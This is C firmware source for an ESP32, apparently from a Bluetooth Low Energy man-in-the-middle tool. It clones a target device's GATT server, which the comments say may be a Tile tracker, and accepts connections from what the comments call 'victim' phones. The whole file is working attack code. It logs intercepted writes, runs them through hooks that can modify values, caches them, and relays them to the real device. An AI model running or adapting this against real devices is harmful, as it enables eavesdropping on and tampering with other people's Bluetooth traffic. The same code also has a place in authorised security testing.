#include "gatt_internal.h"

static void record_bulk_write(uint16_t handle, uint16_t length, bool response) {
  if (!connected) return;
  if (response) {
    if (handle != clone.stream_handle && clone.stream_bytes >= 128 * 1024)
      clone.stream_commit_us = esp_timer_get_time();
    clone.stream_bytes = 0;
    return;
  }
  if (length < 20) return;
  if (handle != clone.stream_handle) {
    clone.stream_handle = handle;
    clone.stream_bytes = 0;
    clone.stream_commit_us = 0;
  }
  if (clone.stream_bytes <= UINT32_MAX - length) clone.stream_bytes += length;
  if (clone.stream_bytes >= 128 * 1024) clone.stream_commit_us = 0;
}

static void release_target_after_bulk_write(void) {
  int64_t elapsed = esp_timer_get_time() - clone.stream_commit_us;
  if (!clone.stream_commit_us || elapsed < 0 || elapsed > 10 * 1000000 ||
      !connected || clone.refresh_pending) return;
  clone.stream_commit_us = 0;
  clone.stream_bytes = 0;
  clone.handoff_pending = true;
  clone.server_ready = false;
  esp_ble_gap_stop_advertising();
  esp_err_t result = esp_ble_gap_disconnect(clone.target_bda);
  if (result == ESP_OK) {
    gatt_send_output("Bulk write complete; releasing target for restart", false);
    return;
  }
  clone.handoff_pending = false;
  clone.server_ready = true;
  esp_ble_gap_start_advertising(&adv_params);
  gatt_send_output("Target release failed; keeping existing session", false);
}

/**
 * server_event
 *
 * Handles the GATT Server
 * events. This is what actually
 * is the copy of the target device
 * and handles connections from
 * victims devices.
 *
 * @param esp_gatts_cb_event_t event
 * @param esp_gatt_if_t gatts_if
 * @param esp_ble_gatts_cb_param_t *param
 */
void server_event(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if,
                  esp_ble_gatts_cb_param_t *param) {
  if (shutdown_gatt_attack) return;
  switch (event) {
    case ESP_GATTS_REG_EVT: {
      clone_register(gatts_if, param);
      break;
    }
    case ESP_GATTS_READ_EVT: {
      if (clone.refresh_pending) {
        esp_ble_gatts_send_response(gatts_if, param->read.conn_id,
            param->read.trans_id, ESP_GATT_BUSY, NULL);
        break;
      }
      start_read(gatts_if, param);
      break;
    }
    case ESP_GATTS_WRITE_EVT: {
      if (clone.refresh_pending) {
        if (param->write.need_rsp)
          esp_ble_gatts_send_response(gatts_if, param->write.conn_id,
              param->write.trans_id, ESP_GATT_BUSY, NULL);
        break;
      }
      /**
       * When a victim sends a write
       * event to a target device
       *
       * We run hooks, log the information
       * and write it to the real target
       * device.
       *
       * The response is handled in the client.
       */
      int outSize = 300 + param->write.len;
      char *out = (char*)malloc(outSize);
      if (!out) {
        ESP_LOGE(TAG, "Failed to allocate memory for out buffer");
        return;
      }

      if (param->write.is_prep) {
        start_prepare(param);
        free(out);
        break;
      }
      char uuid[38] = {0};
      bool isDescriptor = handle_is_descriptor(param->write.handle);
      uint16_t write_len = param->write.len;
      if (write_len > ESP_GATT_MAX_ATTR_LEN) { free(out); break; }
      uint8_t *write_value = NULL;
      if (write_len > 0) {
        write_value = (uint8_t*)malloc(write_len);
        if (!write_value) {
          free(out);
          break;
        }
        memcpy(write_value, param->write.value, write_len);
      }
      if (param->write.need_rsp) {
        if (att_busy()) {
          esp_ble_gatts_send_response(gatts_if, param->write.conn_id,
                                     param->write.trans_id, ESP_GATT_BUSY, NULL);
          free(write_value);
          free(out);
          break;
        }
        pending_write = (pending_write_t){true, isDescriptor, param->write.conn_id,
                                          param->write.trans_id, param->write.handle,
                                          esp_timer_get_time()};
      }
      get_uuid_for_handle(param->write.handle, uuid);

      esp_gatt_write_type_t write_type = param->write.need_rsp
        ? ESP_GATT_WRITE_TYPE_RSP
        : ESP_GATT_WRITE_TYPE_NO_RSP;

      // Handle Descriptor Notfiy/Indicate
      if (isDescriptor && param->write.len == 2) {
        /*
         * We need to enabled the notification for the PARENT
         * characterics, not this desc handle..
         */
        uint16_t notification_target_handle = get_desc_parent_char_handle(param->write.handle);
        uint16_t bit_value = param->write.value[1]<<8 | param->write.value[0];

        if (bit_value == 0x0001) {
          sprintf(out, "Notifiy Enabled - handle: 0x%02x uuid: %s",
                  notification_target_handle, uuid);
          gatt_send_output(out, false);

          esp_err_t ret = esp_ble_gattc_register_for_notify(clone.gattc_if,
                                                            clone.target_bda,
                                                            notification_target_handle);

          if (ret != ESP_OK) {
            ESP_LOGI(TAG, "Error gattc_register_for_notify: %s", esp_err_to_name(ret));
          }
        } else if (bit_value == 0x0002) {
          sprintf(out, "Indicate Enabled - handle: 0x%02x uuid: %s",
                  notification_target_handle, uuid);
          gatt_send_output(out, false);

          esp_err_t ret = esp_ble_gattc_register_for_notify(clone.gattc_if,
                                                            clone.target_bda,
                                                            notification_target_handle);
        }
        else if (bit_value == 0x0000) {
          sprintf(out, "Notifiy/Indicate Disabled - handle: 0x%02x uuid: %s",
                  notification_target_handle, uuid);
          gatt_send_output(out, false);

          esp_err_t ret = esp_ble_gattc_unregister_for_notify(clone.gattc_if,
                                                              clone.target_bda,
                                                              notification_target_handle);

          if (ret != ESP_OK) {
            ESP_LOGI(TAG, "Error gattc_unregister_for_notify: %s", esp_err_to_name(ret));
          } else {
            sprintf(out, "Unregistered Notfication/Indicate - handle: 0x%02x uuid: %s",
                    notification_target_handle, uuid);
            gatt_send_output(out, false);
          }
        }
      }

      char* hex_value = bytes_to_hex_string(param->write.value, param->write.len);
      apply_hook("write", uuid, &hex_value, &write_value, &write_len);

      log_and_send_json(
        "WRITE",
        connected ? "central -> target" : "central -> cache",
        isDescriptor ? "DESC" : "CHAR",
        clone.gattc_if,
        clone.target_client_conn_id,
        param->write.trans_id,
        param->write.handle,
        0,
        uuid,
        hex_value
      );

      bool accepted = !connected || write_queue_add(param->write.conn_id,
          param->write.handle, isDescriptor, param->write.need_rsp,
          write_value, write_len);
      if (!accepted) {
        gatt_send_output("Target write queue exhausted", false);
        if (param->write.need_rsp) finish_pending_write(ESP_GATT_BUSY);
        else {
          write_queue_central_disconnected(param->write.conn_id);
          esp_ble_gap_disconnect(clone.central_bda);
        }
        free(out);
        free(hex_value);
        free(write_value);
        break;
      }
      if (!isDescriptor)
        record_bulk_write(param->write.handle, write_len, param->write.need_rsp);

      free(out);
      free(hex_value);

      // Write to cache
      for (int x = 0; x < clone.num_services; x++) {
        for (int y = 0; y < clone.services[x].num_chars; y++) {
          if (clone.services[x].chars[y].char_handle == param->write.handle) {
            uint8_t *cached = (uint8_t*)malloc(write_len ? write_len : 1);
            if (cached) {
              if (write_len) memcpy(cached, write_value, write_len);
              free(clone.services[x].chars[y].value.attr_value);
              clone.services[x].chars[y].value.attr_value = cached;
              clone.services[x].chars[y].value.attr_len = write_len;
            }
            goto after_find_write;
          } else {
            for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
              if (clone.services[x].chars[y].descs[z].desc_handle == param->write.handle) {
                uint8_t *cached = (uint8_t*)malloc(write_len ? write_len : 1);
                if (cached) {
                  if (write_len) memcpy(cached, write_value, write_len);
                  free(clone.services[x].chars[y].descs[z].value.attr_value);
                  clone.services[x].chars[y].descs[z].value.attr_value = cached;
                  clone.services[x].chars[y].descs[z].value.attr_len = write_len;
                }
                goto after_find_write;
              }
            }
          }
        }
      }

after_find_write:
      free(write_value);
      // Connected writes are acknowledged only by their matching target
      // completion callback. Cached writes can complete immediately.
      if (!connected && param->write.need_rsp) finish_pending_write(ESP_GATT_OK);

      break;
    }
    case ESP_GATTS_EXEC_WRITE_EVT: {
      if (clone.refresh_pending) {
        esp_ble_gatts_send_response(gatts_if, param->exec_write.conn_id,
            param->exec_write.trans_id, ESP_GATT_BUSY, NULL);
        break;
      }
      start_execute(param);
      break;
    }
    case ESP_GATTS_CREATE_EVT: {
      clone_created(param);
      break;
    }
    case ESP_GATTS_START_EVT: {
      clone_started(param);
      break;
    }
    case ESP_GATTS_DELETE_EVT:
      clone_service_deleted(param);
      break;
    case ESP_GATTS_ADD_CHAR_EVT:
      if (param->add_char.status != ESP_GATT_OK)
        clone_failed("add characteristic", param->add_char.status);
      break;
    case ESP_GATTS_ADD_CHAR_DESCR_EVT:
      if (param->add_char_descr.status != ESP_GATT_OK)
        clone_failed("add descriptor", param->add_char_descr.status);
      break;
    case ESP_GATTS_CONNECT_EVT: {
      /**
       * Called when a client (victim) is
       * connected to our gatt server.
       *
       * We set connection parameters and
       * determine if the target device has
       * established a gatt connection.
       */
      esp_ble_conn_update_params_t conn_params = {0};
      memcpy(conn_params.bda, param->connect.remote_bda, sizeof(esp_bd_addr_t));

      // Keep the central connection interval within common iOS BLE limits.
      conn_params.latency = 0;
      conn_params.max_int = 0x20;    // max_int = 0x20*1.25ms = 40ms
      conn_params.min_int = 0x10;    // min_int = 0x10*1.25ms = 20ms
      conn_params.timeout = 400;    // timeout = 400*10ms = 4000ms
      ESP_LOGI(TAG, "ESP_GATTS_CONNECT_EVT, conn_id %d, remote %02x:%02x:%02x:%02x:%02x:%02x:",
              param->connect.conn_id,
              param->connect.remote_bda[0], param->connect.remote_bda[1],
              param->connect.remote_bda[2], param->connect.remote_bda[3],
              param->connect.remote_bda[4], param->connect.remote_bda[5]);

      if (memcmp(clone.target_bda, param->connect.remote_bda, sizeof(clone.target_bda)) == 0) {
        gatt_send_output("TARGET DEVICE HAS CONNECTED TO OUR GATTS", false);
      } else {
        clone.victim_client_conn_id = param->connect.conn_id;
        clone.server_conn_id = param->connect.conn_id;
        memcpy(clone.central_bda, param->connect.remote_bda, 6);
        clone.transactions.central_mtu = 23;
        uart_bridge_phone(true);
      }

      // update connection parameters for the peer device.
      esp_ble_gap_update_conn_params(&conn_params);
      break;
    }
    case ESP_GATTS_DISCONNECT_EVT: {
      bool central = memcmp(clone.target_bda, param->disconnect.remote_bda, 6) != 0;
      if (central)
        uart_bridge_phone(false);
      /**
       * Called when a victim is disconnected
       */
      ESP_LOGI(TAG, "GATTS disconnect reason 0x%x conn_id: %x - "
                    "%02x:%02x:%02x:%02x:%02x:%02x",
              param->disconnect.reason,
              param->disconnect.conn_id,
              param->disconnect.remote_bda[0], param->disconnect.remote_bda[1],
              param->disconnect.remote_bda[2], param->disconnect.remote_bda[3],
              param->disconnect.remote_bda[4], param->disconnect.remote_bda[5]);
      if (!memcmp(clone.target_bda, param->disconnect.remote_bda, 6))
        write_queue_target_disconnected();
      central_transactions_disconnected(param->disconnect.conn_id);
      if (central)
        write_queue_central_disconnected(param->disconnect.conn_id);
      if (pending_write.active && pending_write.conn_id == param->disconnect.conn_id) {
        pending_write.active = false;
      }
      if (central) release_target_after_bulk_write();
      if (!shutdown_gatt_attack && !clone.refresh_pending && clone.server_ready)
        esp_ble_gap_start_advertising(&adv_params);
      break;
    }
    case ESP_GATTS_CONF_EVT: {
      /**
       * I believe this is called
       * after a successful notify/indicate
       * is sent.
       */
      if (param->conf.status != ESP_GATT_OK) {
        ESP_LOGI(TAG, "GATTS confirm failed: status %d attr_handle %x",
                 param->conf.status, param->conf.handle);
        esp_log_buffer_hex(TAG, param->conf.value, param->conf.len);
      }
      break;
    }
    case ESP_GATTS_MTU_EVT: {
      ESP_LOGI(TAG, "ESP_GATTS_MTU_EVT, MTU %d", param->mtu.mtu);
      if (param->mtu.mtu >= 23)
        clone.transactions.central_mtu = param->mtu.mtu;
      // This is the phone's server-side connection, not the Tile's client
      // connection. MTU exchange with the Tile is initiated on client connect.
      break;
    }
    default:
      break;
  }
};
